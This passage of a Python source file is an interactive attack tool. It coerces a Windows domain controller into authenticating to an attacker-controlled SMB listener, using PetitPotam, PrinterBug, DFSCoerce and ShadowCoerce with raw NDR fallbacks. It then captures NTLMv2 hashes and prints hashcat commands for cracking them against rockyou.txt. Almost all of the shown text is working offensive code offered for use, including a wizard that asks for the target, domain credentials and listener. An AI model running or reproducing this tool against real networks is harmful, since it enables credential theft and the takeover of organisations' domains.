    for pipe, use_anon in pipes:
        label = "anon" if use_anon else "auth"
        pi(f"  Trying {pipe} [{label}]")
        dce = None
        try:
            dce = _connect_dce(target, pipe, user, pwd, dom, use_anon)
            dce.bind(uuidtup_to_bin(EFSR_UUID))
            try:
                hEfsRpcOpenFileRaw(dce, unc + "\x00", 0)
            except DCERPCException as inner:
                po(f"  Sent via {pipe} (RPC err: {friendly_error(inner)})")
            log.info(f"PetitPotam sent via {pipe} [{label}]")
            _safe_disconnect(dce, log, pipe)
            return True
        except DCERPCException as exc:
            log.info(f"PetitPotam {pipe} [{label}]: {exc}")
            if _is_expected_rpc_error(exc):
                po(f"  Sent via {pipe} (expected: {friendly_error(exc)})")
                _safe_disconnect(dce, log, pipe)
                return True
            pw(f"  {pipe} [{label}]: {friendly_error(exc)}")
            _safe_disconnect(dce, log, pipe)
        except (socket.timeout, ConnectionRefusedError) as exc:
            pw(f"  {pipe} [{label}]: Connection failed — {exc}")
            log.debug(f"PetitPotam {pipe} connect error: {exc}")
        except OSError as exc:
            pw(f"  {pipe} [{label}]: Network error — {exc}")
            log.debug(f"PetitPotam {pipe} OS error: {exc}")
        except Exception as exc:
            pw(f"  {pipe} [{label}]: Unexpected — {exc}")
            log.debug(
                f"PetitPotam {pipe} unexpected: {exc}\n{traceback.format_exc()}"
            )

    pe("PetitPotam: all pipes failed")
    return False


def _coerce_petitpotam_raw(target: str, listener: str,
                           user: str, pwd: str, dom: str,
                           anon: bool,
                           log: logging.Logger) -> bool:
    unc   = f"\\\\{listener}\\share\\x"
    pipes: List[Tuple[str, bool]] = []
    if anon:
        pipes.append((r"\pipe\lsarpc", True))
    if user:
        pipes += [(r"\pipe\lsarpc", False), (r"\pipe\efsrpc", False)]

    for pipe, use_anon in pipes:
        dce = None
        try:
            dce = _connect_dce(target, pipe, user, pwd, dom, use_anon)
            dce.bind(uuidtup_to_bin(EFSR_UUID))
            req = _ndr_ptr(_ndr_wstr(unc)) + struct.pack("<I", 0)
            for opnum in [0, 1, 4, 5]:
                try:
                    dce.call(opnum, req)
                except DCERPCException:
                    pass
            po(f"  Sent via {pipe} (raw NDR)")
            log.info(f"PetitPotam raw sent via {pipe}")
            _safe_disconnect(dce, log, f"raw/{pipe}")
            return True
        except DCERPCException as exc:
            if _is_expected_rpc_error(exc):
                po(f"  Sent via {pipe} (raw, expected: {friendly_error(exc)})")
                _safe_disconnect(dce, log, f"raw/{pipe}")
                return True
            pw(f"  {pipe} (raw): {friendly_error(exc)}")
            _safe_disconnect(dce, log, f"raw/{pipe}")
        except Exception as exc:
            pw(f"  {pipe} (raw): {exc}")
            log.debug(f"PetitPotam raw {pipe}: {exc}")

    return False


# ═════════════════════════════════════════════════════════
#  COERCION: PRINTERBUG (MS-RPRN)
# ═════════════════════════════════════════════════════════

def coerce_printerbug(target: str, listener: str,
                      user: str, pwd: str, dom: str,
                      log: logging.Logger) -> bool:
    section("PrinterBug  (MS-RPRN)")
    pi(f"Target   : {target}")
    pi(f"Listener : {listener}")
    pi(f"Auth     : {user}@{dom}")

    if not user:
        pe("PrinterBug requires credentials — skipping")
        return False

    if not HAS_RPRN:
        pw("impacket rprn not found — falling back to raw NDR")
        return _coerce_printerbug_raw(target, listener, user, pwd, dom, log)

    dce = None
    try:
        dce = _connect_dce(target, r"\pipe\spoolss", user, pwd, dom, False)
        dce.bind(uuidtup_to_bin(RPRN_UUID))
        po("Connected and bound to MS-RPRN (\\pipe\\spoolss)")
    except DCERPCException as exc:
        pe(f"Bind failed: {friendly_error(exc)}")
        log.debug(f"PrinterBug bind: {exc}")
        _safe_disconnect(dce, log, "spoolss-bind")
        return False
    except (socket.timeout, ConnectionRefusedError) as exc:
        pe(f"Connection failed: {exc}")
        log.debug(f"PrinterBug connect: {exc}")
        return False
    except OSError as exc:
        pe(f"Network error: {exc}")
        log.debug(f"PrinterBug OS: {exc}")
        return False
    except Exception as exc:
        pe(f"Unexpected bind error: {exc}")
        log.debug(f"PrinterBug bind unexpected: {exc}\n{traceback.format_exc()}")
        return False

    pi(f"Opening printer handle for \\\\{target}")
    try:
        resp   = hRpcOpenPrinter(dce, f"\\\\{target}\x00")
        handle = resp["pHandle"]
        po("Printer handle obtained")
    except DCERPCException as exc:
        pe(f"RpcOpenPrinter failed: {friendly_error(exc)}")
        log.debug(f"PrinterBug OpenPrinter: {exc}")
        _safe_disconnect(dce, log, "OpenPrinter")
        return False
    except KeyError:
        pe("RpcOpenPrinter response missing pHandle")
        _safe_disconnect(dce, log, "OpenPrinter-parse")
        return False
    except Exception as exc:
        pe(f"Unexpected handle error: {exc}")
        log.debug(f"PrinterBug handle: {exc}\n{traceback.format_exc()}")
        _safe_disconnect(dce, log, "OpenPrinter-unexpected")
        return False

    pi(f"Sending callback trigger → \\\\{listener}")
    try:
        hRpcRemoteFindFirstPrinterChangeNotificationEx(
            dce, handle, PRINTER_CHANGE_ADD_JOB,
            pszLocalMachine=f"\\\\{listener}\x00",
        )
        po("Coercion sent via PrinterBug")
        log.info("PrinterBug sent")
        _safe_disconnect(dce, log, "PrinterBug-ok")
        return True
    except DCERPCException as exc:
        log.info(f"PrinterBug RPC error: {exc}")
        if _is_expected_rpc_error(exc):
            po(f"Coercion triggered (expected: {friendly_error(exc)})")
            log.info("PrinterBug: coercion triggered (RPC error expected)")
            _safe_disconnect(dce, log, "PrinterBug-expected")
            return True
        pe(f"PrinterBug unexpected RPC error: {friendly_error(exc)}")
        log.warning(f"PrinterBug unexpected: {exc}")
        _safe_disconnect(dce, log, "PrinterBug-bad-rpc")
        return False
    except Exception as exc:
        pe(f"PrinterBug unexpected error: {exc}")
        log.warning(f"PrinterBug unexpected: {exc}\n{traceback.format_exc()}")
        _safe_disconnect(dce, log, "PrinterBug-unexpected")
        return False


def _coerce_printerbug_raw(target: str, listener: str,
                           user: str, pwd: str, dom: str,
                           log: logging.Logger) -> bool:
    dce = None
    try:
        dce = _connect_dce(target, r"\pipe\spoolss", user, pwd, dom, False)
        dce.bind(uuidtup_to_bin(RPRN_UUID))
        po("Connected (raw NDR)")
    except Exception as exc:
        pe(f"PrinterBug raw bind failed: {friendly_error(exc)}")
        log.debug(f"PrinterBug raw bind: {exc}")
        _safe_disconnect(dce, log, "raw-bind")
        return False

    handle = b"\x00" * 20
    try:
        resp = dce.call(
            1,
            _ndr_ptr(_ndr_wstr(f"\\\\{target}"))
            + struct.pack("<I", 0)
            + struct.pack("<II", 0, 0)
            + struct.pack("<I", 0x000F0000),
        )
        if resp and len(resp) >= 20:
            handle = bytes(resp[:20])
    except Exception as exc:
        log.debug(f"PrinterBug raw OpenPrinter: {exc}")

    try:
        dce.call(
            65,
            handle
            + struct.pack("<I", 0x00000100)
            + struct.pack("<I", 0)
            + _ndr_ptr(_ndr_wstr(f"\\\\{listener}"))
            + struct.pack("<I", 0)
            + struct.pack("<I", 0),
        )
        po("Coercion sent (raw NDR)")
        log.info("PrinterBug raw sent")
        _safe_disconnect(dce, log, "raw-ok")
        return True
    except DCERPCException as exc:
        if _is_expected_rpc_error(exc):
            po(f"Coercion triggered (raw, expected: {friendly_error(exc)})")
            log.info(f"PrinterBug raw: {exc}")
            _safe_disconnect(dce, log, "raw-expected")
            return True
        pe(f"PrinterBug raw failed: {friendly_error(exc)}")
        log.debug(f"PrinterBug raw RPC: {exc}")
        _safe_disconnect(dce, log, "raw-bad-rpc")
        return False
    except Exception as exc:
        pe(f"PrinterBug raw unexpected: {exc}")
        log.debug(f"PrinterBug raw: {exc}\n{traceback.format_exc()}")
        _safe_disconnect(dce, log, "raw-unexpected")
        return False


# ═════════════════════════════════════════════════════════
#  COERCION: DFSCOERCE (MS-DFSNM)
# ═════════════════════════════════════════════════════════

def coerce_dfscoerce(target: str, listener: str,
                     user: str, pwd: str, dom: str,
                     log: logging.Logger) -> bool:
    section("DFSCoerce  (MS-DFSNM)")
    pi(f"Target   : {target}")
    pi(f"Listener : {listener}")
    pi(f"Auth     : {user}@{dom}")

    if not user:
        pe("DFSCoerce requires credentials — skipping")
        return False

    dce = None
    try:
        dce = _connect_dce(target, r"\pipe\netdfs", user, pwd, dom, False)
        po("Connected to \\pipe\\netdfs")
        dce.bind(uuidtup_to_bin(DFSNM_UUID))
        po("Bound to MS-DFSNM")
    except DCERPCException as exc:
        pe(f"DFSCoerce bind failed: {friendly_error(exc)}")
        log.debug(f"DFSCoerce bind: {exc}")
        _safe_disconnect(dce, log, "netdfs-bind")
        return False
    except (socket.timeout, ConnectionRefusedError) as exc:
        pe(f"DFSCoerce connection failed: {exc}")
        log.debug(f"DFSCoerce connect: {exc}")
        return False
    except OSError as exc:
        pe(f"DFSCoerce network error: {exc}")
        log.debug(f"DFSCoerce OS: {exc}")
        return False
    except Exception as exc:
        pe(f"DFSCoerce unexpected bind error: {exc}")
        log.debug(f"DFSCoerce bind unexpected: {exc}\n{traceback.format_exc()}")
        return False

    try:
        dce.call(
            12,
            _ndr_ptr(_ndr_wstr(f"\\\\{listener}"))
            + _ndr_ptr(_ndr_wstr("SHARE"))
            + _ndr_ptr(_ndr_wstr("x"))
            + struct.pack("<I", 1),
        )
        po("Coercion sent via DFSCoerce")
        log.info("DFSCoerce sent")
        _safe_disconnect(dce, log, "DFSCoerce-ok")
        return True
    except DCERPCException as exc:
        if _is_expected_rpc_error(exc):
            po(f"Coercion triggered (expected: {friendly_error(exc)})")
            log.info(f"DFSCoerce: {exc}")
            _safe_disconnect(dce, log, "DFSCoerce-expected")
            return True
        pe(f"DFSCoerce failed: {friendly_error(exc)}")
        log.info(f"DFSCoerce RPC: {exc}")
        _safe_disconnect(dce, log, "DFSCoerce-rpc")
        return False
    except Exception as exc:
        pe(f"DFSCoerce unexpected error: {exc}")
        log.debug(f"DFSCoerce unexpected: {exc}\n{traceback.format_exc()}")
        _safe_disconnect(dce, log, "DFSCoerce-unexpected")
        return False


# ═════════════════════════════════════════════════════════
#  COERCION: SHADOWCOERCE (MS-FSRVP)
# ═════════════════════════════════════════════════════════

def coerce_shadowcoerce(target: str, listener: str,
                        user: str, pwd: str, dom: str,
                        log: logging.Logger) -> bool:
    section("ShadowCoerce  (MS-FSRVP)")
    pi(f"Target   : {target}")
    pi(f"Listener : {listener}")
    pi(f"Auth     : {user}@{dom}")

    if not user:
        pe("ShadowCoerce requires credentials — skipping")
        return False

    dce = None
    try:
        dce = _connect_dce(target, r"\pipe\FssagentRpc", user, pwd, dom, False)
        po("Connected to \\pipe\\FssagentRpc")
        dce.bind(uuidtup_to_bin(FSRVP_UUID))
        po("Bound to MS-FSRVP")
    except DCERPCException as exc:
        pe(f"ShadowCoerce bind failed: {friendly_error(exc)}")
        log.debug(f"ShadowCoerce bind: {exc}")
        _safe_disconnect(dce, log, "FssagentRpc-bind")
        return False
    except (socket.timeout, ConnectionRefusedError) as exc:
        pe(f"ShadowCoerce connection failed: {exc}")
        log.debug(f"ShadowCoerce connect: {exc}")
        return False
    except OSError as exc:
        pe(f"ShadowCoerce network error: {exc}")
        log.debug(f"ShadowCoerce OS: {exc}")
        return False
    except Exception as exc:
        pe(f"ShadowCoerce unexpected bind error: {exc}")
        log.debug(
            f"ShadowCoerce bind unexpected: {exc}\n{traceback.format_exc()}"
        )
        return False

    share = f"\\\\{listener}\\share"
    pi(f"ShareName: {share}")
    try:
        dce.call(8, _ndr_ptr(_ndr_wstr(share)))
        po("Coercion sent via ShadowCoerce")
        log.info("ShadowCoerce sent")
        _safe_disconnect(dce, log, "ShadowCoerce-ok")
        return True
    except DCERPCException as exc:
        if _is_expected_rpc_error(exc):
            po(f"Coercion triggered (expected: {friendly_error(exc)})")
            log.info(f"ShadowCoerce: {exc}")
            _safe_disconnect(dce, log, "ShadowCoerce-expected")
            return True
        pe(f"ShadowCoerce failed: {friendly_error(exc)}")
        log.info(f"ShadowCoerce RPC: {exc}")
        _safe_disconnect(dce, log, "ShadowCoerce-rpc")
        return False
    except Exception as exc:
        pe(f"ShadowCoerce unexpected error: {exc}")
        log.debug(f"ShadowCoerce unexpected: {exc}\n{traceback.format_exc()}")
        _safe_disconnect(dce, log, "ShadowCoerce-unexpected")
        return False


# ═════════════════════════════════════════════════════════
#  ATTACK ORCHESTRATION
# ═════════════════════════════════════════════════════════

def run_attacks(cfg: Dict,
                log: logging.Logger) -> List[Tuple[str, bool]]:
    results: List[Tuple[str, bool]] = []
    tech    = cfg["technique"]
    run_all = "All" in tech

    kw = dict(
        target   = cfg["target_ip"],
        listener = cfg["listener_ip"],
        user     = cfg["username"],
        pwd      = cfg["password"],
        dom      = cfg["domain"],
        log      = log,
    )

    if run_all or "PetitPotam" in tech:
        try:
            ok = coerce_petitpotam(**kw, anon=cfg["use_anon"])
        except Exception as exc:
            pe(f"PetitPotam uncaught: {exc}")
            log.error(f"PetitPotam: {exc}\n{traceback.format_exc()}")
            ok = False
        results.append(("PetitPotam", ok))
        time.sleep(2)

    if run_all or "PrinterBug" in tech:
        try:
            ok = coerce_printerbug(**kw)
        except Exception as exc:
            pe(f"PrinterBug uncaught: {exc}")
            log.error(f"PrinterBug: {exc}\n{traceback.format_exc()}")
            ok = False
        results.append(("PrinterBug", ok))
        time.sleep(2)

    if run_all or "DFSCoerce" in tech:
        try:
            ok = coerce_dfscoerce(**kw)
        except Exception as exc:
            pe(f"DFSCoerce uncaught: {exc}")
            log.error(f"DFSCoerce: {exc}\n{traceback.format_exc()}")
            ok = False
        results.append(("DFSCoerce", ok))
        time.sleep(2)

    if run_all or "ShadowCoerce" in tech:
        try:
            ok = coerce_shadowcoerce(**kw)
        except Exception as exc:
            pe(f"ShadowCoerce uncaught: {exc}")
            log.error(f"ShadowCoerce: {exc}\n{traceback.format_exc()}")
            ok = False
        results.append(("ShadowCoerce", ok))

    return results


# ═════════════════════════════════════════════════════════
#  OUTPUT
# ═════════════════════════════════════════════════════════

def save_hashes(captures: List[Dict],
                outfile: str,
                log: logging.Logger) -> None:
    if not captures:
        pw("No hashes captured — nothing to save.")
        return
    try:
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(f"# NTLMv2 hashes captured {datetime.now()}\n")
            f.write("# hashcat -m 5600 this_file rockyou.txt --force\n\n")
            for c in captures:
                f.write(
                    f"# {c['timestamp']} | {c['source_ip']} | {c['protocol']}\n"
                    f"{c['hash']}\n\n"
                )
        po(f"Hashes saved → {outfile}")
        pi(f"Crack: hashcat -m 5600 {outfile} /usr/share/wordlists/rockyou.txt")
        log.info(f"Saved {len(captures)} hash(es) to {outfile}")
    except PermissionError:
        pe(f"Permission denied writing '{outfile}'")
        log.error(f"Cannot write hash file (permission denied): {outfile}")
    except OSError as exc:
        pe(f"Cannot write '{outfile}': {exc}")
        log.error(f"Cannot write hash file: {exc}")
    except Exception as exc:
        pe(f"Unexpected save error: {exc}")
        log.error(f"save_hashes: {exc}\n{traceback.format_exc()}")


def print_results(results: List[Tuple[str, bool]],
                  captures: List[Dict],
                  cfg: Dict) -> None:
    section("RESULTS")
    if results:
        w = max(len(n) for n, _ in results) + 2
        for name, ok in results:
            mark = (
                f"{C.GREEN}✓ Sent{C.RESET}"
                if ok else
                f"{C.RED}✗ Failed{C.RESET}"
            )
            print(f"  {name:<{w}} {mark}")
    else:
        pw("No techniques were run.")
    print()

    if captures:
        po(f"{len(captures)} NTLMv2 hash(es) captured!")
        for i, c in enumerate(captures, 1):
            try:
                parts = c["hash"].split("::")
                usr   = parts[0]
                dom   = parts[1].split(":")[0] if len(parts) > 1 else "?"
            except (IndexError, AttributeError):
                usr = dom = "?"
            print(
                f"  [{i}] {C.YELLOW}{usr}@{dom}{C.RESET} "
                f"from {c['source_ip']}"
            )
    else:
        pw("No hashes captured.")
        print(f"\n  Check log: {C.CYAN}cat {cfg.get('log_file', 'coerce.log')}{C.RESET}")
        print(f"\n  Manual test from DC:")
        print(
            f"    {C.CYAN}net use \\\\{cfg.get('listener_ip', '?')}\\x{C.RESET}"
        )


# ═════════════════════════════════════════════════════════
#  CONFIGURATION — all fields re-prompt on bad input
# ═════════════════════════════════════════════════════════

def _detect_local_ip() -> str:
    try:
        import re
        r = subprocess.run(
            ["ip", "route", "get", "192.168.10.0"],
            capture_output=True, text=True, timeout=3,
        )
        m = re.search(r"src (\d+\.\d+\.\d+\.\d+)", r.stdout)
        if m:
            return m.group(1)
    except Exception:
        pass
    return "127.0.0.1"


def gather_config() -> Optional[Dict]:
    """
    Interactive wizard.  Every field with validation re-prompts on bad
    input — the function never returns None due to a validation failure,
    only when the user explicitly declines to proceed at the review step
    or presses Ctrl+C.
    """
    section("CONFIGURATION")

    # ── [1/5] Listener ───────────────────────────────────
    print(f"{C.BOLD}[1/5] Listener{C.RESET}\n")
    local_ip    = _detect_local_ip()

    # ask_ip loops until a valid IP is entered
    listener_ip   = ask_ip(
        "Listener IP (must be reachable from DC)", default=local_ip
    )
    listener_port = ask_port("Listener port", default=445)

    # ── [2/5] Target ─────────────────────────────────────
    print(f"\n{C.BOLD}[2/5] Target DC{C.RESET}\n")
    target_ip = ask_ip("Target DC IP")

    pi(f"Checking {target_ip}:445 …")
    try:
        s = socket.create_connection((target_ip, 445), timeout=5)
        s.close()
        po("DC port 445 is reachable")
    except socket.timeout:
        pw("DC port 445 timed out — continuing anyway")
    except ConnectionRefusedError:
        pw("DC port 445 refused — continuing anyway")
    except OSError as exc:
        pw(f"Connectivity check failed ({exc}) — continuing anyway")

    # ── [3/5] Credentials ────────────────────────────────
    print(f"\n{C.BOLD}[3/5] Credentials{C.RESET}\n")
    use_anon = ask_bool("Try PetitPotam anonymously?", default=False)
    print(
        f"\n  {C.CYAN}Domain credentials "
        f"(leave blank to skip credentialled attacks){C.RESET}\n"
    )
    domain   = ask("Domain",   required=False)
    username = ask("Username", required=False)
    password = ask("Password", required=False) if username else ""

    # ── [4/5] Technique ──────────────────────────────────
    print(f"\n{C.BOLD}[4/5] Technique{C.RESET}\n")
    techniques = [
        "PetitPotam   (MS-EFSR  — anonymous possible)",
        "PrinterBug   (MS-RPRN  — requires credentials)",
        "DFSCoerce    (MS-DFSNM — requires credentials)",
        "ShadowCoerce (MS-FSRVP — requires credentials)",
        "All           (run all techniques in order)",
    ]
    choice = ask_choice("Select technique:", techniques)

    # ── [5/5] Output ─────────────────────────────────────
    print(f"\n{C.BOLD}[5/5] Output{C.RESET}\n")
    ts      = datetime.now().strftime("%Y%m%d_%H%M%S")

    # ask_filename loops until a writable path is provided
    outfile = ask_filename("Hash output file", default=f"hashes_{ts}.txt")
    logfile = ask_filename("Log file",         default=f"coerce_{ts}.log")
    wait    = ask_int(
        "Wait for callbacks (seconds)", default=60,
        min_val=10, max_val=600,
    )

    # ── Review ───────────────────────────────────────────
    section("REVIEW")
    cred      = "anonymous" if not username else f"{username}@{domain}"
    rprn_note = (
        f" {C.GREEN}(impacket rprn){C.RESET}"
        if HAS_RPRN else
        f" {C.YELLOW}(raw NDR fallback){C.RESET}"
    )
    efsr_note = (
        f" {C.GREEN}(impacket efsrpc){C.RESET}"
        if HAS_EFSRPC else
        f" {C.YELLOW}(raw NDR fallback){C.RESET}"
    )
    print(f"  Listener   : {C.GREEN}{listener_ip}:{listener_port}{C.RESET}")
    print(f"  Target     : {C.GREEN}{target_ip}{C.RESET}")
    print(f"  Creds      : {C.GREEN}{cred}{C.RESET}")
    print(f"  Technique  : {C.GREEN}{choice}{C.RESET}")
    print(f"  PrinterBug :{rprn_note}")
    print(f"  PetitPotam :{efsr_note}")
    print(f"  Hash file  : {C.GREEN}{outfile}{C.RESET}")
    print(f"  Log file   : {C.GREEN}{logfile}{C.RESET}")
    print(f"  Wait       : {C.GREEN}{wait}s{C.RESET}\n")

    if not ask_bool("Proceed?", default=True):
        pi("Cancelled.")
        return None

    return {
        "listener_ip":   listener_ip,
        "listener_port": listener_port,
        "target_ip":     target_ip,
        "use_anon":      use_anon,
        "domain":        domain,
        "username":      username,
        "password":      password,
        "technique":     choice,
        "output_file":   outfile,
        "log_file":      logfile,
        "wait_secs":     wait,
    }


# ═════════════════════════════════════════════════════════
#  SIGNAL HANDLING
# ═════════════════════════════════════════════════════════

_listener_ref: Optional[SMBListener]    = None
_config_ref:   Optional[Dict]           = None
_logger_ref:   Optional[logging.Logger] = None


def _signal_handler(sig: int, frame) -> None:
    print(
        f"\n{C.YELLOW}[!] Signal {sig} received — "
        f"saving results and exiting…{C.RESET}"
    )
    if _listener_ref:
        _listener_ref.stop()
    if _listener_ref and _config_ref and _logger_ref:
        captures = _listener_ref.get_captures()
        save_hashes(captures, _config_ref["output_file"], _logger_ref)
        print_results([], captures, _config_ref)
    sys.exit(0)


# ═════════════════════════════════════════════════════════
#  MAIN
# ═════════════════════════════════════════════════════════

def main() -> None:
    global _listener_ref, _config_ref, _logger_ref

    signal.signal(signal.SIGINT,  _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    banner()

    # ── Preflight ────────────────────────────────────────
    section("PREFLIGHT")

    if sys.version_info < (3, 7):
        pe(f"Python 3.7+ required (got {sys.version.split()[0]})")
        sys.exit(1)
    po(f"Python {sys.version.split()[0]}")

    if not HAS_IMPACKET:
        pe("impacket not found — install: pip install impacket")
        sys.exit(1)
    po("impacket core found")

    if HAS_RPRN:
        po("impacket rprn   module found (PrinterBug — proper NDR)")
    else:
        pw("impacket rprn   not found — raw NDR fallback")

    if HAS_EFSRPC:
        po("impacket efsrpc module found (PetitPotam — proper NDR)")
    else:
        pw("impacket efsrpc not found — raw NDR fallback")

    if os.geteuid() != 0:
        pw("Not root — port 445 requires sudo")
    else:
        po("Running as root")

    # ── Config ───────────────────────────────────────────
    try:
        cfg = gather_config()
    except KeyboardInterrupt:
        print()
        pi("Cancelled.")
        sys.exit(0)

    if cfg is None:
        sys.exit(0)

    _config_ref = cfg
    log         = setup_logging(cfg["log_file"])
    _logger_ref = log
    log.info(
        f"Session start | target={cfg['target_ip']} "
        f"listener={cfg['listener_ip']}:{cfg['listener_port']} "
        f"user={cfg['username'] or 'anon'} "
        f"rprn={HAS_RPRN} efsrpc={HAS_EFSRPC}"
    )

    # ── Start listener ────────────────────────────────────
    section("STARTING LISTENER")
    for cmd in (
        ["fuser", "-k", f"{cfg['listener_port']}/tcp"],
        ["systemctl", "stop", "smbd", "nmbd", "samba"],
    ):
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass
    time.sleep(0.5)

    domain_label = cfg["domain"].upper() if cfg["domain"] else "CS"
    listener     = SMBListener(
        cfg["listener_ip"], cfg["listener_port"], log,
        domain=domain_label,
    )
    _listener_ref = listener

    if not listener.start():
        pe("Cannot start SMB listener — aborting")
        sys.exit(1)

    time.sleep(0.3)
    try:
        s = socket.create_connection(
            (cfg["listener_ip"], cfg["listener_port"]), timeout=3
        )
        s.close()
        po("Self-test: listener is accepting connections")
    except socket.timeout:
        pw("Self-test timed out")
    except ConnectionRefusedError:
        pw("Self-test: connection refused — bind may have failed silently")
    except OSError as exc:
        pw(f"Self-test failed: {exc}")

    # ── Attack ────────────────────────────────────────────
    section("LAUNCHING COERCION ATTACKS")
    try:
        results = run_attacks(cfg, log)
    except Exception as exc:
        pe(f"run_attacks raised an uncaught exception: {exc}")
        log.error(f"run_attacks: {exc}\n{traceback.format_exc()}")
        results = []

    # ── Wait ──────────────────────────────────────────────
    wait = cfg["wait_secs"]
    section(f"WAITING {wait}s FOR CALLBACKS")
    pi(f"Live log: tail -f {cfg['log_file']}")
    pi("Press Ctrl+C to stop early\n")

    try:
        for remaining in range(wait, 0, -1):
            n = len(listener.get_captures())
            print(
                f"\r  {C.CYAN}[{remaining:3d}s]{C.RESET}  "
                f"Hashes captured: {C.GREEN}{n}{C.RESET}   ",
                end="", flush=True,
            )
            time.sleep(1)
    except KeyboardInterrupt:
        print()
        pw("Wait interrupted.")

    print()
    listener.stop()

    captures = listener.get_captures()
    save_hashes(captures, cfg["output_file"], log)
    print_results(results, captures, cfg)
    log.info(f"Session complete — {len(captures)} hash(es) captured")
    po("Done.")


if __name__ == "__main__":
    main()
